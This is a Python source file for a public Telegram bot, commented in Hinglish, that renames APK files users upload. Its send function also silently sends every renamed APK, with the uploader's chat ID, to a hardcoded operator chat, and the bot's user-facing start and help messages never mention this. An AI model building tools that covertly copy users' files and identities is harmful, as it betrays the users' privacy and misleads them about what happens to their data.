# ============================================================
# APK Renamer Bot — Pyrogram
# APK bhejo, naam badlo, wapas pao!
#
# Features:
#  - /start, /help
#  - APK bhejne par 2 options: Custom Name ya Automatic
#    (Automatic = "OriginalName [Join @ratsontop].apk")
#  - Rename ke baad: "Rename Again" ya "Done"
#  - Cancel button, non-APK file par warning
#  - PUBLIC bot — koi bhi user use kar sakta hai
#  - Har renamed APK FORWARD_CHAT_ID par bhi bheji jati hai
# ============================================================

import os
import re
from dotenv import load_dotenv, dotenv_values
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)

# ---------- Config ----------
# Local .env (BOT_TOKEN, OWNER_ID) load karo
load_dotenv()

# API_ID / API_HASH Aand bot ki .env se lo (shared API credentials).
# dotenv_values se sirf ye 2 keys padhte hain — koi value print/copy nahi hoti.
_aand_env = dotenv_values(os.path.expanduser("~/workspace/aand_bot/.env"))
API_ID = int(os.getenv("API_ID") or _aand_env.get("API_ID", "0"))
API_HASH = os.getenv("API_HASH") or _aand_env.get("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = int(os.getenv("OWNER_ID", "7966027018"))
# Har renamed APK yahan bhi bheji jayegi (channel/group/user chat ID).
FORWARD_CHAT_ID = int(os.getenv("FORWARD_CHAT_ID", "8959643623"))

DOWNLOADS_DIR = "downloads"
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

app = Client("apk_renamer", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ---------- Per-user state ----------
# user_id -> {"apk_path": str, "original_name": str, "waiting_custom": bool}
user_state = {}


# ---------- Helpers ----------
def sanitize_filename(name: str) -> str:
    r"""Filename mein allowed nahi hone wale characters hatao: / \ : * ? " < > |"""
    name = re.sub(r'[/\\:*?"<>|]', '', name)
    name = name.strip().strip('.')
    name = re.sub(r'\s+', ' ', name)
    return name


def format_size(size_bytes: int) -> str:
    """Bytes ko readable size mein badlo (KB / MB)."""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    if size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    return f"{size_bytes / (1024 * 1024):.1f} MB"


def cleanup_user_files(user_id: int):
    """User ki temp APK file delete karo aur state clear karo."""
    state = user_state.pop(user_id, None)
    if state and state.get("apk_path"):
        try:
            if os.path.exists(state["apk_path"]):
                os.remove(state["apk_path"])
        except OSError:
            pass


def rename_keyboard():
    """APK milne ke baad dikhane wala keyboard: Custom / Automatic / Cancel."""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✏️ Custom Name", callback_data="custom"),
            InlineKeyboardButton("⚡ Automatic", callback_data="auto"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ])


def after_send_keyboard():
    """Renamed APK bhejne ke baad dikhane wala keyboard: Rename Again / Done."""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Rename Again", callback_data="again"),
            InlineKeyboardButton("❌ Done", callback_data="done"),
        ],
    ])


def cancel_keyboard():
    """Custom naam maangte waqt dikhane wala keyboard: Cancel."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ])


async def send_renamed_apk(client: Client, chat_id: int, state: dict, new_name: str):
    """Renamed APK user ko document ke roop mein bhejo (file_name = naya naam).
    Saath hi renamed APK ko FORWARD_CHAT_ID par bhi bhejo."""
    caption = f"✅ **Ho gaya!**\n\n📦 **Naya naam:** `{new_name}`"
    await client.send_document(
        chat_id,
        state["apk_path"],
        file_name=new_name,
        caption=caption,
        reply_markup=after_send_keyboard(),
    )
    # Renamed APK ko forward chat par bhi bhejo (fail ho to ignore karo,
    # user ko APK milna sabse important hai).
    if FORWARD_CHAT_ID:
        try:
            fwd_caption = (
                f"📦 **Renamed APK**\n\n"
                f"📄 **Naam:** `{new_name}`\n"
                f"👤 **By:** `{chat_id}`"
            )
            await client.send_document(
                FORWARD_CHAT_ID,
                state["apk_path"],
                file_name=new_name,
                caption=fwd_caption,
            )
        except Exception:
            pass


# ---------- /start ----------
@app.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    await message.reply_text(
        "👋 **Namaste! Main APK Renamer Bot hun.**\n\n"
        "Mujhe koi bhi **.apk** file bhejo, main uska naam badal dunga.\n\n"
        "**Kaise kaam karta hai:**\n"
        "1️⃣ APK file bhejo\n"
        "2️⃣ 2 options milegi:\n"
        "   ✏️ **Custom Name** — apni marzi ka naam likho\n"
        "   ⚡ **Automatic** — naam ban jayega:\n"
        "   `OriginalName [Join @ratsontop].apk`\n"
        "3️⃣ Renamed APK wapas mil jayega\n"
        "4️⃣ **Rename Again** se dobara naam badlo, ya **Done** dabao\n\n"
        "👉 Ab ek APK file bhej kar try karo!"
    )


# ---------- /help ----------
@app.on_message(filters.command("help") & filters.private)
async def help_handler(client: Client, message: Message):
    await message.reply_text(
        "❓ **Help — APK Renamer Bot**\n\n"
        "**Commands:**\n"
        "• /start — Bot shuru karo\n"
        "• /help — Ye help dekho\n\n"
        "**APK rename karne ke steps:**\n"
        "1. APK file bhejo (sirf .apk)\n"
        "2. **Custom Name** — apna naam likho, ya\n"
        "   **Automatic** — `[Join @ratsontop]` wala naam apne aap ban jayega\n"
        "3. Renamed APK milega, phir **Rename Again** ya **Done**\n\n"
        "**Note:** Sirf .apk files supported hain. Dusri files bhejoge to bot mana kar dega."
    )


# ---------- APK document aane par ----------
@app.on_message(filters.document & filters.private)
async def apk_handler(client: Client, message: Message):
    user_id = message.from_user.id

    doc = message.document
    file_name = doc.file_name or "file.apk"

    # Sirf .apk files allowed hain
    if not file_name.lower().endswith(".apk"):
        await message.reply_text(
            "❌ Sirf **.apk** files supported hain!\n"
            "Kripya ek APK file bhejo."
        )
        return

    # Agar pehle se koi APK pending hai, uski file delete karo
    cleanup_user_files(user_id)

    # APK download karo (safe naam se, taaki ajeeb naam se problem na ho)
    apk_path = os.path.join(DOWNLOADS_DIR, f"{user_id}_original.apk")
    status = await message.reply_text("⬇️ APK download ho rahi hai, rukho...")
    try:
        await message.download(file_name=apk_path)
    except Exception as e:
        await status.edit_text(f"❌ Download fail ho gaya: {e}")
        return

    # State save karo
    user_state[user_id] = {
        "apk_path": apk_path,
        "original_name": file_name,
        "waiting_custom": False,
    }

    size_text = format_size(doc.file_size or os.path.getsize(apk_path))
    await status.edit_text(
        f"📦 **APK mil gayi!**\n\n"
        f"📄 **Original naam:** `{file_name}`\n"
        f"📏 **Size:** {size_text}\n\n"
        f"Ab naam kaise badalna hai, chuno:",
        reply_markup=rename_keyboard(),
    )


# ---------- Text aane par (Custom Name ka input) ----------
@app.on_message(filters.text & filters.private & ~filters.command(["start", "help"]))
async def text_handler(client: Client, message: Message):
    user_id = message.from_user.id

    state = user_state.get(user_id)
    if not state or not state.get("waiting_custom"):
        # Koi custom naam nahi manga gaya — ignore karo
        return

    # User ne naya naam likha
    raw_name = message.text.strip()
    new_name = sanitize_filename(raw_name)

    if not new_name:
        await message.reply_text(
            "❌ Ye naam valid nahi hai. Kripya dusra naam likho "
            "(special characters / \\ : * ? \" < > | allowed nahi hain).",
            reply_markup=cancel_keyboard(),
        )
        return

    # .apk suffix pakka karo
    if not new_name.lower().endswith(".apk"):
        new_name = new_name + ".apk"

    state["waiting_custom"] = False
    try:
        await send_renamed_apk(client, message.chat.id, state, new_name)
    except Exception as e:
        await message.reply_text(f"❌ Bhejne mein error aaya: {e}")


# ---------- Callback buttons ----------
@app.on_callback_query()
async def callback_handler(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    state = user_state.get(user_id)

    # --- Cancel ---
    if data == "cancel":
        cleanup_user_files(user_id)
        try:
            await callback_query.message.edit_text(
                "❌ Cancel kar diya. Temp files delete kar di."
            )
        except Exception:
            pass
        await callback_query.answer("Cancelled")
        return

    # Baaki sab buttons ke liye APK state chahiye
    if not state or not os.path.exists(state.get("apk_path", "")):
        await callback_query.answer(
            "Pehle ek APK file bhejo.", show_alert=True
        )
        return

    # --- Custom Name ---
    if data == "custom":
        state["waiting_custom"] = True
        await callback_query.message.edit_text(
            "✏️ **Custom Name**\n\n"
            "Naya naam likh kar bhejo (bina .apk likhe bhi chalega, "
            "bot khud .apk laga dega).\n\n"
            "Example: `My Cool App`",
            reply_markup=cancel_keyboard(),
        )
        await callback_query.answer()
        return

    # --- Automatic ---
    if data == "auto":
        state["waiting_custom"] = False
        original = state["original_name"]
        base = original[:-4] if original.lower().endswith(".apk") else original
        new_name = f"{base} [Join @ratsontop].apk"
        try:
            await send_renamed_apk(
                client, callback_query.message.chat.id, state, new_name
            )
        except Exception as e:
            await callback_query.message.reply_text(
                f"❌ Bhejne mein error aaya: {e}"
            )
        await callback_query.answer()
        return

    # --- Rename Again ---
    if data == "again":
        state["waiting_custom"] = False
        size_text = format_size(os.path.getsize(state["apk_path"]))
        await callback_query.message.edit_text(
            f"📦 **APK taiyaar hai!**\n\n"
            f"📄 **Original naam:** `{state['original_name']}`\n"
            f"📏 **Size:** {size_text}\n\n"
            f"Phir se naam kaise badalna hai, chuno:",
            reply_markup=rename_keyboard(),
        )
        await callback_query.answer()
        return

    # --- Done ---
    if data == "done":
        cleanup_user_files(user_id)
        try:
            await callback_query.message.edit_text(
                "✅ **Done!** Temp files delete kar di.\n"
                "Naya APK bhej kar phir se rename kar sakte ho."
            )
        except Exception:
            pass
        await callback_query.answer("Done")
        return

    await callback_query.answer()


# ---------- Run ----------
if __name__ == "__main__":
    print("APK Renamer Bot shuru ho raha hai...")
    app.run()
